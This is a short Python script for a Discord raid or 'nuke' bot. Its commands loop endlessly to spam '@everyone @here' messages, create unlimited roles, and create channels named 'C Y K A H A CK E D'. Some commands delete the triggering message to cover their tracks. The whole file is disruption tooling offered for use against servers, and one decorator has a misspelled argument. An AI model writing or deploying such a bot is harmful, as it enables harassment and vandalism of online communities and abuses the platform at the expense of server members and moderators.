import discord
import asyncio
from discord.ext import commands
from discord.ext.commands import Bot
bot = commands.Bot(command_prefix='*')
@bot.command()
async def spam(ctx):
    while True:        
        await ctx.send("lol noobs! @everyone @here")
@bot.command(pass_cotext=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="oh no")
##MAKE CHANNELS##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    while True:
        await guild.create_text_channel('C Y K A H A CK E D')
bot.run("ur token")
